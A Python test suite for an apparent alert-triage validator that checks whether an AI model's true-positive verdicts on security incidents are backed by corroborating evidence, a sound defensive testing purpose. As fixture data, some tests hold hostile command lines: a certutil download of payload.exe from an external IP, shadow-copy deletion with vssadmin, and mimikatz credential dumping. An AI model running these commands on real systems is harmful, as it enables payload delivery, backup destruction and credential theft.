"""
AIS 2.4b Targeted Regression and Validator Integrity Test Suite.
Validates:
1. Dual-use administrative tools / LOLBins require corroborating malicious indicators.
2. Definitive adversary tradecraft (e.g. credential dumping, ransomware shadow deletion) validated as TP when corroborated.
3. Benign administrative context / change tickets refute unsupported TP escalation.
4. Non-executable web assets and static scripts cannot establish TP tradecraft.
5. Strict execution provenance taxonomy: LIVE_PROVIDER, OFFLINE_SIMULATION, PREFLIGHT_ABSTENTION, PROVIDER_FAILURE.
6. Non-manufacturing of token counts and latency on preflight abstention and provider failures.
7. Token budget accounting under 4,096 and 8,192 context windows.
8. Safe denominator handling for undefined statistical metrics (verified TP = 0 -> unsafe_fp_rate is None).
9. Telemetry blinding and ground-truth isolation.
"""

import pytest
import re
from typing import Dict, Any, List

from app.schemas.canonical_evidence import CanonicalEvidenceRecord, EvidenceNormalizationResult
from app.schemas.evidence_contract import RuleEvidenceContract, EvidenceFieldRequirement
from app.services.evidence_preflight_validator import EvidencePreflightValidator
from app.services.model_claim_extractor import ModelClaimExtractor
from app.services.independent_verdict_validator import IndependentVerdictValidator
from app.services.historical_ground_truth_validator import HistoricalGroundTruthValidator
from app.services.token_budget_service import TokenBudgetService
from app.schemas.verdict_intelligence import GroundTruthLabel
from app.services.empirical_benchmark_harness import (
    EmpiricalBenchmarkHarness,
    BenchmarkIncidentRecord,
    BenchmarkIncidentResult,
)


def _make_rec(ev_id: str, field: str, value: Any, ev_type: str, inc_id: str = "INC-TEST") -> CanonicalEvidenceRecord:
    return CanonicalEvidenceRecord(
        evidence_id=ev_id,
        incident_id=inc_id,
        source_field=field,
        observed_value=value,
        evidence_type=ev_type,
        integrity_digest=f"digest-{ev_id}",
    )


def _make_norm(records: List[CanonicalEvidenceRecord], inc_id: str = "INC-TEST") -> EvidenceNormalizationResult:
    by_type: Dict[str, List[CanonicalEvidenceRecord]] = {}
    by_field: Dict[str, List[CanonicalEvidenceRecord]] = {}
    for r in records:
        by_type.setdefault(r.evidence_type, []).append(r)
        by_field.setdefault(r.source_field, []).append(r)
    return EvidenceNormalizationResult(
        incident_id=inc_id,
        total_evidence_count=len(records),
        available_evidence_count=len(records),
        records=records,
        evidence_by_type=by_type,
        evidence_by_field=by_field,
        field_validation_status={r.source_field: "PRESENT_VALID" for r in records},
    )


def _make_contract(rule_id: str = "PH_RULE_TEST", required_fields: List[str] = None) -> RuleEvidenceContract:
    reqs = [
        EvidenceFieldRequirement(field=f, evidence_type="OBSERVED_FACT", critical=True)
        for f in (required_fields or ["process.command_line", "network.destination_ip"])
    ]
    return RuleEvidenceContract(
        contract_id=f"CONTRACT-{rule_id}",
        rule_id=rule_id,
        rule_name="Test Rule",
        version_number=1,
        status="APPROVED",
        required_evidence=reqs,
    )


def test_dual_use_lolbin_without_corroboration_routed_to_attention():
    """
    Dual-use administrative commands (e.g. whoami /all, net user admin) support
    a suspicious activity hypothesis but must NOT automatically certify malicious breach
    in the absence of corroborating attack indicators (e.g. external network connection,
    temp directory execution, or threat intelligence hit).
    """
    inc_id = "INC-LOLBIN-UNCORROBORATED"
    cmd = "whoami.exe /all"
    records = [
        _make_rec("EV-1", "process.command_line", cmd, "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-2", "process.file_name", "whoami.exe", "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-3", "process.executable_path", "C:\\Windows\\System32\\whoami.exe", "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-4", "user.name", "DOMADMIN\\jdoe", "USER_CONTEXT", inc_id),
        _make_rec("EV-5", "network.destination_ip", "10.0.1.50", "NETWORK_CONNECTION", inc_id),
    ]
    norm_result = _make_norm(records, inc_id)
    contract = _make_contract("RULE-LOLBIN", ["process.command_line", "network.destination_ip"])
    preflight = EvidencePreflightValidator.validate_preflight(
        incident_id=inc_id,
        contract=contract,
        normalization_result=norm_result,
        allow_simulation=True,
    )

    model_output = {
        "verdict": "TRUE_POSITIVE",
        "confidence": 85.0,
        "reason": f"Adversary discovery command executed: {cmd}.",
        "supporting_claims": [
            {
                "claim_type": "PROCESS_EXECUTION",
                "field": "process.command_line",
                "asserted_value": cmd,
                "cited_evidence_ids": ["EV-1"],
            }
        ],
    }

    grounding = ModelClaimExtractor.extract_and_ground_claims(inc_id, model_output, norm_result)
    val_res = IndependentVerdictValidator.validate_verdict(
        incident_id=inc_id,
        proposed_verdict="TRUE_POSITIVE",
        raw_model_confidence=85.0,
        preflight=preflight,
        claim_grounding=grounding,
        normalization_result=norm_result,
        contract=contract,
        model_reason=model_output["reason"],
    )

    # Invariant: Must NOT accept decisive TRUE_POSITIVE!
    assert val_res.final_verdict == "REQUIRES_ATTENTION"
    assert val_res.is_decisive_accepted is False
    assert "TP_CRITERIA_UNSATISFIED" in val_res.validation_reason_codes
    assert "Dual-use administrative command or LOLBin" in val_res.analyst_action_directive


def test_dual_use_lolbin_with_external_corroboration_accepts_tp():
    """
    When dual-use LOLBin activity is corroborated by an untrusted external network
    connection (e.g. certutil downloading from external public IP), decisive TRUE_POSITIVE is validated.
    """
    inc_id = "INC-LOLBIN-CORROBORATED"
    cmd = "certutil.exe -urlcache -split -f http://203.0.113.55/payload.exe C:\\Temp\\payload.exe"
    records = [
        _make_rec("EV-1", "process.command_line", cmd, "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-2", "process.file_name", "certutil.exe", "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-3", "process.executable_path", "C:\\Windows\\System32\\certutil.exe", "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-4", "network.destination_ip", "203.0.113.55", "NETWORK_CONNECTION", inc_id),
    ]
    norm_result = _make_norm(records, inc_id)
    contract = _make_contract("RULE-LOLBIN", ["process.command_line", "network.destination_ip"])
    preflight = EvidencePreflightValidator.validate_preflight(
        incident_id=inc_id,
        contract=contract,
        normalization_result=norm_result,
        allow_simulation=True,
    )

    model_output = {
        "verdict": "TRUE_POSITIVE",
        "confidence": 92.0,
        "reason": f"Ingress tool transfer using certutil.exe to external IP 203.0.113.55.",
        "supporting_claims": [
            {
                "claim_type": "PROCESS_EXECUTION",
                "field": "process.command_line",
                "asserted_value": cmd,
                "cited_evidence_ids": ["EV-1"],
            },
            {
                "claim_type": "NETWORK_CONNECTION",
                "field": "network.destination_ip",
                "asserted_value": "203.0.113.55",
                "cited_evidence_ids": ["EV-4"],
            },
        ],
    }

    grounding = ModelClaimExtractor.extract_and_ground_claims(inc_id, model_output, norm_result)
    val_res = IndependentVerdictValidator.validate_verdict(
        incident_id=inc_id,
        proposed_verdict="TRUE_POSITIVE",
        raw_model_confidence=92.0,
        preflight=preflight,
        claim_grounding=grounding,
        normalization_result=norm_result,
        contract=contract,
        model_reason=model_output["reason"],
    )

    assert val_res.final_verdict == "TRUE_POSITIVE"
    assert val_res.is_decisive_accepted is True
    assert "EVIDENCE_VALIDATED" in val_res.validation_reason_codes


def test_shadow_copy_deletion_with_benign_administrative_context_rejected():
    """
    If shadow copy deletion occurs in the presence of an enterprise backup service
    or approved change ticket, decisive TRUE_POSITIVE must be overruled to REQUIRES_ATTENTION
    due to benign context contradiction.
    """
    inc_id = "INC-SHADOW-BACKUP"
    cmd = "vssadmin.exe delete shadows /all /quiet"
    records = [
        _make_rec("EV-1", "process.command_line", cmd, "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-2", "process.file_name", "backup_agent.exe", "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-3", "authorization.ticket_id", "CHG-90210", "AUTHORIZATION", inc_id),
        _make_rec("EV-4", "network.destination_ip", "10.0.0.1", "NETWORK_CONNECTION", inc_id),
    ]
    norm_result = _make_norm(records, inc_id)
    contract = _make_contract("RULE-SHADOW", ["process.command_line", "network.destination_ip"])
    preflight = EvidencePreflightValidator.validate_preflight(
        incident_id=inc_id,
        contract=contract,
        normalization_result=norm_result,
        allow_simulation=True,
    )

    model_output = {
        "verdict": "TRUE_POSITIVE",
        "confidence": 95.0,
        "reason": f"Adversary ransomware shadow copy deletion: {cmd}.",
        "supporting_claims": [
            {
                "claim_type": "PROCESS_EXECUTION",
                "field": "process.command_line",
                "asserted_value": cmd,
                "cited_evidence_ids": ["EV-1"],
            }
        ],
    }

    grounding = ModelClaimExtractor.extract_and_ground_claims(inc_id, model_output, norm_result)
    val_res = IndependentVerdictValidator.validate_verdict(
        incident_id=inc_id,
        proposed_verdict="TRUE_POSITIVE",
        raw_model_confidence=95.0,
        preflight=preflight,
        claim_grounding=grounding,
        normalization_result=norm_result,
        contract=contract,
        model_reason=model_output["reason"],
    )

    assert val_res.final_verdict == "REQUIRES_ATTENTION"
    assert val_res.is_decisive_accepted is False
    assert "BENIGN_CONTEXT_CONTRADICTION" in val_res.validation_reason_codes


def test_credential_dumping_syntax_validated_as_tp():
    """
    Definitive adversary tradecraft (e.g. mimikatz sekurlsa) in process command line
    without benign contradictions validates decisive TRUE_POSITIVE.
    """
    inc_id = "INC-MIMIKATZ"
    cmd = "mimikatz.exe privilege::debug sekurlsa::logonpasswords exit"
    records = [
        _make_rec("EV-1", "process.command_line", cmd, "PROCESS_EXECUTION", inc_id),
        _make_rec("EV-2", "network.destination_ip", "10.10.10.10", "NETWORK_CONNECTION", inc_id),
    ]
    norm_result = _make_norm(records, inc_id)
    contract = _make_contract("RULE-CREDDUMP", ["process.command_line", "network.destination_ip"])
    preflight = EvidencePreflightValidator.validate_preflight(
        incident_id=inc_id,
        contract=contract,
        normalization_result=norm_result,
        allow_simulation=True,
    )

    model_output = {
        "verdict": "TRUE_POSITIVE",
        "confidence": 99.0,
        "reason": f"Credential dumping attack detected: {cmd}.",
        "supporting_claims": [
            {
                "claim_type": "PROCESS_EXECUTION",
                "field": "process.command_line",
                "asserted_value": cmd,
                "cited_evidence_ids": ["EV-1"],
            }
        ],
    }

    grounding = ModelClaimExtractor.extract_and_ground_claims(inc_id, model_output, norm_result)
    val_res = IndependentVerdictValidator.validate_verdict(
        incident_id=inc_id,
        proposed_verdict="TRUE_POSITIVE",
        raw_model_confidence=99.0,
        preflight=preflight,
        claim_grounding=grounding,
        normalization_result=norm_result,
        contract=contract,
        model_reason=model_output["reason"],
    )

    assert val_res.final_verdict == "TRUE_POSITIVE"
    assert val_res.is_decisive_accepted is True
    assert "EVIDENCE_VALIDATED" in val_res.validation_reason_codes


def test_provenance_isolation_and_no_token_fabrication():
    """
    Enforces that:
    1. PROVIDER_FAILURE records None for prompt_tokens, completion_tokens, total_tokens.
    2. PREFLIGHT_ABSTENTION records None for prompt_tokens, completion_tokens, total_tokens.
    3. is_live_measurement is strictly False unless execution_provenance is LIVE_PROVIDER.
    4. raw_proposed_verdict is None when inference did not execute.
    """
    # Provider Failure
    res_fail = BenchmarkIncidentResult(
        incident_id="INC-FAIL-01",
        rule_id="RULE-1",
        rule_name="Rule 1",
        ground_truth_label="UNVERIFIED",
        raw_proposed_verdict=None,
        execution_provenance="PROVIDER_FAILURE",
        is_live_measurement=False,
        prompt_tokens=None,
        completion_tokens=None,
        total_tokens=None,
        latency_ms=120,
        finish_reason="provider_error",
        endpoint_identity="http://172.26.41.241:8000/v1",
    )
    assert res_fail.raw_proposed_verdict is None
    assert res_fail.prompt_tokens is None
    assert res_fail.completion_tokens is None
    assert res_fail.total_tokens is None
    assert res_fail.is_live_measurement is False
    assert res_fail.endpoint_identity == "http://172.26.41.241:8000/v1"

    # Preflight Abstention
    res_abstain = BenchmarkIncidentResult(
        incident_id="INC-ABSTAIN-01",
        rule_id="RULE-1",
        rule_name="Rule 1",
        ground_truth_label="UNVERIFIED",
        raw_proposed_verdict=None,
        execution_provenance="PREFLIGHT_ABSTENTION",
        is_live_measurement=False,
        prompt_tokens=None,
        completion_tokens=None,
        total_tokens=None,
        latency_ms=None,
        finish_reason="abstained_preflight",
    )
    assert res_abstain.raw_proposed_verdict is None
    assert res_abstain.prompt_tokens is None
    assert res_abstain.completion_tokens is None
    assert res_abstain.total_tokens is None
    assert res_abstain.is_live_measurement is False


def test_token_budget_strict_invariant_4k_vs_8k():
    """
    Verifies that TokenBudgetService strictly calculates available prompt tokens:
    At 4,096 tokens: prompt <= 3,328 (completion = 768, total <= 4,096).
    At 8,192 tokens: prompt <= 7,424 (completion = 768, total <= 8,192).
    """
    avail_4k = TokenBudgetService.calculate_available_input_tokens(max_context_tokens=4096, reserved_output_tokens=768)
    assert avail_4k == 3328
    assert avail_4k + 768 == 4096

    avail_8k = TokenBudgetService.calculate_available_input_tokens(max_context_tokens=8192, reserved_output_tokens=768)
    assert avail_8k == 7424
    assert avail_8k + 768 == 8192


def test_undefined_statistical_denominators_return_none():
    """
    When verified TP count is 0, unsafe_fp_rate must be None (not 0.0 or 0%).
    When decisive count is 0, overall_accuracy must be None (not 0.0 or 1.0).
    """
    results = [
        BenchmarkIncidentResult(
            incident_id="INC-1", rule_id="R1", rule_name="R1", ground_truth_label="VERIFIED_FP",
            final_authoritative_verdict="REQUIRES_ATTENTION", is_decisive_accepted=False,
        ),
        BenchmarkIncidentResult(
            incident_id="INC-2", rule_id="R1", rule_name="R1", ground_truth_label="UNVERIFIED",
            final_authoritative_verdict="REQUIRES_ATTENTION", is_decisive_accepted=False,
        ),
    ]

    metrics = EmpiricalBenchmarkHarness.calculate_cohort_metrics(results)
    assert metrics.verified_tp_count == 0
    assert metrics.unsafe_fp_rate is None  # Denominator is zero!
    assert metrics.decisive_decisions_count == 0
    assert metrics.overall_accuracy is None  # No decisive decisions!
    assert metrics.abstention_rate == 1.0
